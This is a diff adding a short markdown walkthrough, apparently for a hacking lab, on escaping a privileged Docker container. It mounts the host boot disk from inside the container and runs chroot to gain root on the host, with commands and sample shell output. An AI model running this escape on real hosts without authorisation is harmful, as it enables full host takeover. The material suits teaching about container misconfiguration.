@@ -1,0 +1,34 @@
+#### Let's start a privileged container
+```
+$ docker run -it --privileged xxradar/hackon
+```
+#### Let's check we are privileged container
+
+You can check if you're in a privileged container
+```
+ls /dev
+```
+or 
+```
+fdisk -l
+```
+or (not yet interesting)
+```
+ps aux #nothing abnormal
+```
+#### Mount the boot disk
+```
+mount /dev/xvda1 /mnt
+```
+#### Check this out ...
+```
+root@8d79950f837e:/mnt/etc# cat /etc/hostname
+8d79950f837e
+root@8d79950f837e:/mnt/etc# cat /mnt/etc/hostname
+ip-10-1-1-52
+root@8d79950f837e:/mnt/etc#
+```
+#### Become root on the host
+```
+chroot /mnt
+```
